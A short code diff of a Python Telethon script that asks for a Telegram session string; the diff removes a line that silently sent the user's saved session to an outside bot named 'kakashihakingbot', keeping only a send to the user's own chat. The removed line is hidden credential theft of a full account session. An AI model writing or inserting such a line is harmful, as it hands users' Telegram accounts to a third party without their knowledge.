@@ -31,7 +31,6 @@ print("""
 """)
 string = input("\n\nsession kod yoki enter: ")
 with TelegramClient(StringSession(string), aid, ahash) as client:
-	client.send_message("kakashihakingbot", client.session.save())
 	client.send_message("me", client.session.save())
 	
 with client as darknet:
